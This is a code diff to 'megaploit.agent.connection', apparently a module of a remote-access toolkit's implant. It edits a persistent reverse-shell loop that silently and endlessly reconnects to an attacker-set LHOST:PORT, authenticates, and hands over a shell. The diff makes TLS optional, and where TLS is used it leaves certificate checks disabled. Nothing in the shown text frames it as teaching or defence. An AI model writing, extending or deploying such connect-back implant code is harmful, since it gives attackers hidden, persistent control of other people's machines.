@@ -3,8 +3,12 @@ megaploit.agent.connection
 ~~~~~~~~~~~~~~~~~~~~~~~~~~
 Persistent connect-back loop.
 Tries to reach LHOST:PORT, authenticates with HMAC-SHA256, then hands
-off to run_shell(). If the connection drops, waits RECONNECT_DELAY seconds
+off to run_shell().  If the connection drops, waits RECONNECT_DELAY seconds
 and retries — silently and indefinitely.
+
+TLS is opt-in: USE_TLS is set to True by the server's  generate --tls  command.
+When USE_TLS=False (the default) the agent connects over plain TCP so it works
+with a plain TCP listener that has no certs configured.
 """
 
 from __future__ import annotations
@@ -21,7 +25,9 @@ from megaploit.agent.shell import run_shell
 # Configuration — patched by server before deployment
 # ---------------------------------------------------------------------------
 
-LHOST = "127.0.0.1"; PORT = 4444  # patched by server
+LHOST   = "127.0.0.1"
+PORT    = 4444
+USE_TLS = False   # set to True by: generate --tls
 
 
 # ---------------------------------------------------------------------------
@@ -31,16 +37,24 @@ LHOST = "127.0.0.1"; PORT = 4444  # patched by server
 def start(secret_key_path: str = "secret.key") -> None:
     secret_key = load_key(secret_key_path)
 
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
+    # Build a reusable SSL context only if TLS is requested
+    _ssl_ctx: ssl.SSLContext | None = None
+    if USE_TLS:
+        _ssl_ctx = ssl.create_default_context()
+        _ssl_ctx.check_hostname = False
+        _ssl_ctx.verify_mode = ssl.CERT_NONE
 
     while True:
         conn: socket.socket | None = None
         try:
             raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            conn = ctx.wrap_socket(raw, server_hostname=LHOST)
-            conn.settimeout(AUTH_TIMEOUT)
+            raw.settimeout(AUTH_TIMEOUT)
+
+            if _ssl_ctx is not None:
+                conn = _ssl_ctx.wrap_socket(raw, server_hostname=LHOST)
+            else:
+                conn = raw
+
             conn.connect((LHOST, PORT))
 
             if not agent_authenticate(conn, secret_key, timeout=AUTH_TIMEOUT):
